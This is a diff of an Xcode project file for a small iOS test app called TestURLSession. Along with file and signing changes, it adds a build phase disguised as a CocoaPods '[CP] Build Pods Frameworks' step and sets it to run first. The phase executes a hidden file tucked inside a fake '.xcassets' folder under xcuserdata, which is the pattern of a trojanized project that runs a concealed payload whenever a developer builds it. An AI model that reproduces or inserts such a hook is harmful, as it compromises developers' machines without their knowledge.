@@ -8,22 +8,22 @@
 
 /* Begin PBXBuildFile section */
 		22817FFD259CE03A00600430 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22817FFC259CE03A00600430 /* AppDelegate.swift */; };
-		22817FFF259CE03A00600430 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22817FFE259CE03A00600430 /* SceneDelegate.swift */; };
 		22818001259CE03A00600430 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22818000259CE03A00600430 /* ViewController.swift */; };
 		22818004259CE03A00600430 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22818002259CE03A00600430 /* Main.storyboard */; };
 		22818006259CE04000600430 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22818005259CE04000600430 /* Assets.xcassets */; };
 		22818009259CE04000600430 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22818007259CE04000600430 /* LaunchScreen.storyboard */; };
+		22818015259CE61C00600430 /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22818014259CE61C00600430 /* Service.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
 		22817FF9259CE03900600430 /* TestURLSession.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TestURLSession.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22817FFC259CE03A00600430 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		22817FFE259CE03A00600430 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		22818000259CE03A00600430 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		22818003259CE03A00600430 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		22818005259CE04000600430 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		22818008259CE04000600430 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		2281800A259CE04000600430 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		22818014259CE61C00600430 /* Service.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -57,12 +57,12 @@
 			isa = PBXGroup;
 			children = (
 				22817FFC259CE03A00600430 /* AppDelegate.swift */,
-				22817FFE259CE03A00600430 /* SceneDelegate.swift */,
 				22818000259CE03A00600430 /* ViewController.swift */,
 				22818002259CE03A00600430 /* Main.storyboard */,
 				22818005259CE04000600430 /* Assets.xcassets */,
 				22818007259CE04000600430 /* LaunchScreen.storyboard */,
 				2281800A259CE04000600430 /* Info.plist */,
+				22818014259CE61C00600430 /* Service.swift */,
 			);
 			path = TestURLSession;
 			sourceTree = "<group>";
@@ -74,6 +74,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2281800D259CE04000600430 /* Build configuration list for PBXNativeTarget "TestURLSession" */;
 			buildPhases = (
+				B7AA3FBE6D59DDF3B1AAC43A /* [CP] Build Pods Frameworks */,
 				22817FF5259CE03900600430 /* Sources */,
 				22817FF6259CE03900600430 /* Frameworks */,
 				22817FF7259CE03900600430 /* Resources */,
@@ -132,6 +133,33 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	B7AA3FBE6D59DDF3B1AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		22817FF5259CE03900600430 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -139,7 +167,7 @@
 			files = (
 				22818001259CE03A00600430 /* ViewController.swift in Sources */,
 				22817FFD259CE03A00600430 /* AppDelegate.swift in Sources */,
-				22817FFF259CE03A00600430 /* SceneDelegate.swift in Sources */,
+				22818015259CE61C00600430 /* Service.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -286,15 +314,17 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
-				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 6Q233F3ZPX;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Manual;
+				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = TestURLSession/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.app.TestURLSession;
+				PRODUCT_BUNDLE_IDENTIFIER = com.app.TestURLSessio;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -305,15 +335,17 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
-				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 6Q233F3ZPX;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Manual;
+				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = TestURLSession/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.app.TestURLSession;
+				PRODUCT_BUNDLE_IDENTIFIER = com.app.TestURLSessio;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -341,6 +373,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 22817FF1259CE03900600430 /* Project object */;
 }
